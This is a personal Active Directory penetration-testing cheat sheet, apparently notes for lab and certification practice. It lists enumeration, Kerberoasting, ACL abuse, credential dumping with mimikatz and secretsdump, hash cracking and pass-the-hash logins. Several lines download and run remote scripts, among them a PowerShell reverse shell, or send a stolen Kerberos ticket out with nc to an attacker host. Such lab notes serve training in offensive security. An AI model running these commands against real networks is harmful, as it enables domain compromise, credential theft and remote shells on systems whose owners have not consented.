#   Pre Enumeration

##  DNS Enumeration
-   dig axfr mx txt all ns any <domain> @$IP 
-   nslookup
>   IP
>   DOMAIN

##  Domain Enumeration  [PowerView.ps1]
-   nmap -sT -Pn -n --open $IP -p389 --script ldap-rootdse

-   IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
-   . .\PowerView.ps1
-   import-module .\PowerView.ps1

[+] Enumerating the Domain
-   get-netdomain
-   Get-DomainPolicy
-   get-domainsid

[+] User Enumeration
-   get-netuser | select cn
-   get-netuser | select -expandproperty samaccountname
-   find-userfield - SearchField description "pass"

[+] Group Enumeration
-   Get-NetGroup
-   get-netgroup -UserName "nathan"
-   get-netgroup -GroupName "it admins" -FullData

[+] Domain Network Computers / Shares Enumeration
-   Get-NetComputer
-   Get-NetComputer -FullData
-   Get-NetComputer -OperatingSystem "*Windows 10*"
-   Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
-   Invoke-FileFinder

[+] Enumeration Local Admins Users
-   Invoke-EnumerateLocalAdmin

[+] Enumeration Group Policy Objects
-   get-netgpo

[+] Enumeration Access Control List [**ACL**]
-   get-objectacl
-   get-objectacl -SamAccountName "engineering" -ResolveGUIDs

>   `GenericAll` on Group   [Cherry TREE: 0xGenAll]

-   GOT GenericAll somewhere -> Add/Delete/Modify users in that group
-   I'm members of `A` group, I have GenericAll permission on `B` group, so i can do A/D/M users on that B group

```
-   net group B r.smith /del /domain
-   net group B /domain
-   net group B hacker /add /domain       [Add Oursself to the group]
```

##  ACL [GeneritcAll/WriteDacl/AS-REP]


##  LDAP Enumeration
-   ldapsearch -x -H ldap://$IP -s base namingcontexts
-   ldapsearch -x -H ldap://$IP -s base namingcontexts -b "DC=offsec,DC=com"
-   ldapsearch -x -H ldap://$IP -D '' -w '' -s base namingcontexts -b "DC=offsec,DC=com"
-   ldapsearch -x -H ldap://$IP -D 'domain/username' -w "Password" -s base namingcontexts -b "DC=offsec,DC=com"
-   ldapsearch -x -H ldap://192.168.189.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName | cut -d":" -f2
-   ldapsearch -x -H ldap://192.168.189.122 -D '' -w '' -b "DC=hutch,DC=offsec" '(objectClass=person)' | grep description
-   ldapsearch -x -H ldap://192.168.189.122 -D '' -w '' -b "DC=hutch,DC=offsec" '(objectClass=person)' | grep info


##  RPC ENumeration
-   rpcclient $IP
-   rpcclient -U '' $IP
-   rpcclient -U '' -N $IP
>   enumdomusers
>   queryusergroups <username>
>   queryusergroups <RID>
>   querygroup <group-rid>
>   queryuser <RID>
>   rpcclient>srvinfo
>   rpcclient>enumdomusers
>   rpcclient>getdompwinfo
-   `rpcclient --user=DOMAIN/USERNAME%PASSWORD IP_ADDRESS`
-   `rpcclient --user=active.htb/SVC_TGS%GPPstillStandingStrong2k18 $IP`
-   `rpcclient -U "" -N <IP>`

-   enum4linux -a $IP
-   impacket-rpcdump -p 135 $IP

##  SMB Enumeration

-   smbclient -L $IP
-   smbclient -U "" -L $IP
-   smbclient -U "" -N -L $IP
-   smbclient -U "" //<IP>/IPC$

-   smbmap -u "" -H <IP>
-   smbmap -H <IP>

##  Kerberos Enumeration

-   /PDATA/offsec-prep/LINUX/kerbrute_linux_amd64 userenum -d hutch.offsec users.txt --dc $IP

##  impacket-GetAdUsers.py
-   impacket-GetADUsers -all hutch.offsec/ -dc-ip $IP

##  impacket-GetNPUsers
-   impacket-GetNPUsers hutch.offsec/ -usersfile users -format hashcat -outputfile hashes_hutch -dc-ip $IP
-   impacket-GetNPUsers htb.local/ -dc-ip 10.129.255.128 -usersfile users.txt -format john -outputfile hashes

##  impacket-GetUserSPNs.py
-   impacket-GetUserSPNs -request hutch.offsec/username 

##	BruteForce


>   impacket-samrdump 10.129.96.60


#   Post Enumeration [PrevEsc]

>   PORT scaning 

-   nc -z -v 10.10.8.8 20-80

##  BloodHound Setup

1.  Upload and run sharphound.exe on target `[SharpHound.exe --collectionmethods ALL]-[SharpHound.exe -c ALL]`
2.  Take back the zip file in our kali box
3.  locate neo4j | grep auth    [remove-the-files] [password-reset]
3.  run `neo4j console`
4.  run bloodhound 
5.  upload the zip file

##  Powershell Remoting

-   Enter-PSSession -ComputerName workstation-02
-   Enter-PSSession -ComputerName workstation-02 -Credential domain\username    [work-on-gui]
-   Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-02 -Credential domain\username    [work-on-gui]

-   `[PASS the actual $credential object if you want to work it on CMD prompt]`

##  Domain Enumeration

##  User Enumeration /domain 

>   net logged on user

##  Group Enumeration / Nested Group Enumeration

##  Permissions missuse []

##	WinPrevEsc



##  Find SPNs

-   .\GetUserSPNs.ps1
-   POST-ENUMERATION.MD

##  Pivoting / Two Level Pivoting / Port Forwarding / Tunnling


##  Password Dump
>   mimikatz
>   sam/system
>   crunch
>   finding more passwords in files []


### Password DUMP USING SAM/SYSTEM

-   C:\>reg save HKLM\SAM C:\sam
-   C:\>reg save HKLM\SYSTEM C:\system
-   impacket-secretsdump 'FRIENDS/svc_backup:Password9@192.168.159.149' 
-   impacket-secretsdump -sam sam -system system LOCAL
-   hashcat -m 1000 'ntlm' /opt/rockyou

### Password DUMP USING Cached Credentials  [AD]

[+] imapcket / pwoershell mimikatz

-   mimikatz.exe
-   privilege::debug
-   sekurlsa::logonpasswords
--------------------------------
-   sekurlsa::logonpasswords
-   privilege::debug sekurlsa::logonpasswords
-   lsadump::sam
-   token::elevate lsadump::sam
-   lsadump::secrets
-   token::elevate lsadump::secrets
-   vault::cred
---------------------------------

### Password DUMP USING SPNs    [AD]

>	PS C:\Users\nathan\Desktop> .\GetUserSPNs.ps1
>	Add-Type -AssemblyName System.IdentityModel
>   PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "FRIENDS-DC/svc_backups.FRIENDS.local:1337"
>   klist
-   C:> mimikatz.exe
>   # kerberos::list /export  
-   c:\Users\temp>dir /x
-   c:\Users\temp>nc.exe 192.168.119.195 80 < 1-40A1~1.KIR
>   __# kirbi2john svc_backup.kirbi > hash

-   └─# hashcat -m 13100 sql_kirbi_2_hash /opt/rockyou.txt
>   __# john hash --wordlist=/opt/rockyou.txt
>   __# hashcat hash /opt/rockyou.txt

>   [svc_backup:Password9]
>   [8c802621d2e36fc074345dded890f3e5]  `[Now we have either password or hash, let's go for login or PTH]`


##  Password Cracking

>   NTLM HASH `[-m 1000]`

-   hashcat -a 0 -m 1000 'aaaaaaaabsdf345dfgfg34fdfgghh' /opt/rockyou.txt
-   hashcat -a 0 -m 1000 'aaaaaaaabsdf345dfgfg34fdfgghh' -r OneRuleToRuleThemAll.rule /opt/rockyou.txt

-   john hash.txt --format=nt --wordlist=/opt/rockyou.txt

``` hash.txt
8c802621d2e36fc074345dded890f3e5
abcdre2234345trewquiopdssdfoldfg
abcdre2234345trewquiopdssdfoldfg
```
>   NTLMv2 HASH

```password.txt
SVC_Mycv::WIN-6821:4141414141414141:e60214562321adssfsf5sf5sfd:dsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfddsfsdcoo12323fsdfd23423bvfd
```
-   john --format=netntlmv2 password.txt --wordlist=/opt/rockyou.txt
-   hashcat -m 5600 password.txt /opt/rockyou.txt --force

##  Password Reuse / Password Spraying [RDP,SMB,LDAP,FTP,SSH,WEB]

[+] crackmapexec

[+] hydra

[+] medusa

##  PTH / Login With Creds [RDP,SMB,LDAP,FTP,SSH,WEB]

>   evil-winrm -u admin -i 192.168.2.10 -p 'Password@123'
>   evil-winrm -u domain\\admin -i 192.168.2.10 -p 'Password@123'

>   impacket-psexec 'FRIENDS/svc_backup:Password9@192.168.159.149'  [DC-IP]

└─# impacket-psexec 'Administrator@192.168.161.59' -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5

[+] RDP

>   hydra -l administrator -p 123456 rdp://10.2.2.86
>   xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.175.87 /d:domainname
>   xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.175.87
>   xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
>   proxychains rdesktop 10.2.2.86 -u john -p easyas123 -g 1024x768 -x 0x80
>   rdesktop -u user -p password321 10.10.102.190
>   xfreerdp /u:admin /pth:<HASH> /d:pentesting.local /v:192.168.15.20
>   reminna

[+] Powershell
  
-   $SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
-   $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
-   Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/Invoke-PowerShellTcp.ps1')" -Credential $cred

